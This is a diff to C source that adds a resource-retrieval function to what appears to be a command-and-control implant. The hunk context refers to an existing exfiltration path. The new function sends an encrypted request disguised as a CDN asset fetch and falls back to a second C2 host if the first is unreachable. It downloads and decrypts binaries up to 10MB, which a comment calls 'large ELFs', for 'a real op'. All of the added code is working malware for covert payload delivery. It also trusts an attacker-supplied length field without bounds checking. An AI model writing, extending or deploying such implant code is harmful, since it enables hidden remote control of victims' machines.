@@ -846,3 +846,140 @@ aegis_result_t aegis_c2_send_result(aegis_c2_ctx_t *ctx, const uint8_t *data,
   /* Task results use the same exfiltration path with a different msg type */
   return aegis_c2_exfiltrate(ctx, data, data_len, "task_result");
 }
+
+/* ── Generic Resource Retrieval ──────────────────────────────────────────── */
+
+aegis_result_t aegis_c2_fetch_resource(aegis_c2_ctx_t *ctx,
+                                       const char *resource_id,
+                                       uint8_t **res_out,
+                                       size_t *res_len) {
+  if (!ctx || !resource_id || !res_out || !res_len)
+    return AEGIS_ERR_GENERIC;
+
+  *res_out = NULL;
+  *res_len = 0;
+
+  /* Build request envelope */
+  aegis_c2_envelope_t env;
+  memset(&env, 0, sizeof(env));
+  env.magic = AEGIS_C2_HEADER_MAGIC;
+  env.msg_type = C2_MSG_RESOURCE_REQ;
+  env.sequence = ctx->sequence++;
+  memcpy(env.node_id, ctx->node_id, sizeof(env.node_id));
+
+  /* Encrypt the resource ID as the payload */
+  size_t id_len = strlen(resource_id);
+  uint8_t ct_buf[256];
+  if (id_len > sizeof(ct_buf))
+    return AEGIS_ERR_GENERIC;
+
+  aegis_result_t rc = aegis_encrypt(ctx->crypto, (const uint8_t *)resource_id,
+                                    id_len, (const uint8_t *)&env, sizeof(env),
+                                    ct_buf, env.iv, env.tag);
+  if (rc != AEGIS_OK)
+    return rc;
+
+  env.payload_len = (uint32_t)id_len;
+
+  /* Assemble message */
+  size_t msg_len = sizeof(env) + id_len;
+  uint8_t *msg = malloc(msg_len);
+  if (!msg)
+    return AEGIS_ERR_ALLOC;
+
+  memcpy(msg, &env, sizeof(env));
+  memcpy(msg + sizeof(env), ct_buf, id_len);
+
+  char *http_buf = malloc(msg_len + 2048);
+  if (!http_buf) {
+    free(msg);
+    return AEGIS_ERR_ALLOC;
+  }
+
+  /* Construct URL path: /cdn/assets/<resource_id_hash> */
+  /* For simplicity, we just use the resource ID directly in the path
+     (in a real op, this would be hashed) */
+  char path[256];
+  snprintf(path, sizeof(path), "/cdn/assets/%s", resource_id);
+
+  size_t http_len = build_http_post(http_buf, msg_len + 2048, ctx->primary_host,
+                                    path, msg, msg_len);
+  free(msg);
+
+  tls_conn_t conn;
+  rc = tls_connect(&conn, ctx->primary_host, ctx->primary_port);
+  if (rc != AEGIS_OK) {
+    rc = tls_connect(&conn, ctx->fallback_host, ctx->fallback_port);
+    if (rc != AEGIS_OK) {
+      free(http_buf);
+      return rc;
+    }
+  }
+
+  tls_send(&conn, http_buf, http_len);
+  free(http_buf);
+
+  /* Receive response (max 10MB for large ELFs) */
+  size_t max_size = 10 * 1024 * 1024;
+  uint8_t *recv_buf = malloc(max_size);
+  if (!recv_buf) {
+    tls_disconnect(&conn);
+    return AEGIS_ERR_ALLOC;
+  }
+
+  size_t recv_total = 0;
+  ssize_t n;
+  while ((n = tls_recv(&conn, recv_buf + recv_total,
+                       max_size - recv_total)) > 0) {
+    recv_total += (size_t)n;
+    if (recv_total >= max_size) break;
+  }
+  tls_disconnect(&conn);
+
+  if (recv_total == 0) {
+    free(recv_buf);
+    return AEGIS_ERR_NETWORK;
+  }
+
+  /* Parse HTTP response */
+  const uint8_t *body;
+  size_t body_len;
+  rc = parse_http_response(recv_buf, recv_total, &body, &body_len);
+  if (rc != AEGIS_OK) {
+    free(recv_buf);
+    return rc;
+  }
+
+  /* Decrypt resource */
+  if (body_len <= sizeof(aegis_c2_envelope_t)) {
+    free(recv_buf);
+    return AEGIS_ERR_NETWORK;
+  }
+
+  const aegis_c2_envelope_t *resp_env = (const aegis_c2_envelope_t *)body;
+  const uint8_t *res_ct = body + sizeof(aegis_c2_envelope_t);
+  size_t res_ct_len = resp_env->payload_len;
+
+  /* Allocate buffer for decrypted resource */
+  *res_out = malloc(res_ct_len);
+  if (!*res_out) {
+    free(recv_buf);
+    return AEGIS_ERR_ALLOC;
+  }
+
+  rc = aegis_decrypt(ctx->crypto, res_ct, res_ct_len, body,
+                     sizeof(aegis_c2_envelope_t), resp_env->iv, resp_env->tag,
+                     *res_out);
+
+  free(recv_buf);
+
+  if (rc != AEGIS_OK) {
+    AEGIS_ZERO(*res_out, res_ct_len);
+    free(*res_out);
+    *res_out = NULL;
+    return rc;
+  }
+
+  *res_len = res_ct_len;
+  return AEGIS_OK;
+}
